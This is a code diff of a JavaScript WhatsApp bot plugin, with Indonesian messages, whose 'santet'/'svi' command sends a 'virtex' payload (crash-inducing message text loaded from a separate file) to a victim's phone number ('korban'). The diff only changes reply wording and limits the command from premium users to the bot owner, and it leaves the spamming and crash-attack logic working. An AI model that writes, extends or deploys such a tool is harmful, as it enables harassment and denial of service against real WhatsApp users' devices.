@@ -2,11 +2,11 @@
 let virtex = require('../virtex/index.js')
 let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) => {
     if (!(isOwner || isPrems)) {
-        global.dfail("premium", m, conn)
+        global.dfail("owner", m, conn)
         throw false
     }
     if (!text) throw `Silahkan masukan nomor yang ingin di spam\n\nContoh: ${usedPrefix + command} 628xxxx`;
-    m.reply('Virtex Meluncur...')
+    m.reply('Virtex Meluncur BossQ...')
 
     let korban = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
     if (!korban) throw 'nomor tidak valid'
@@ -18,7 +18,7 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) =
 
     let react = await conn.sendMessage(korban, {
         react: {
-            text: 'Hallo👋',
+            text: 'Hallo Om👋',
             key: m.key
         }
     })
@@ -29,7 +29,7 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) =
                 mentions: await conn.parseMention(virtex)
             }, { quoted: pickRandom([ftroli, react]) })
         }
-        conn.reply(m.chat, `Sukses mengirim virtex ke @${korban.split`@`[0]}`, m, { mentions: [korban] })
+        conn.reply(m.chat, `Sukses Mengirim Virtex BossQ, Ke @${korban.split`@`[0]}`, m, { mentions: [korban] })
     } catch (e) {
         console.log(e)
     }
@@ -37,8 +37,7 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) =
 handler.help = ['santet', 'svi'].map(v => v + ' <nomor>')
 handler.tags = ['premium','virus']
 handler.command = /^santet|svi$/i
-handler.premium = true
-handler.limit = true
+handler.owner = true
 
 module.exports = handler
 
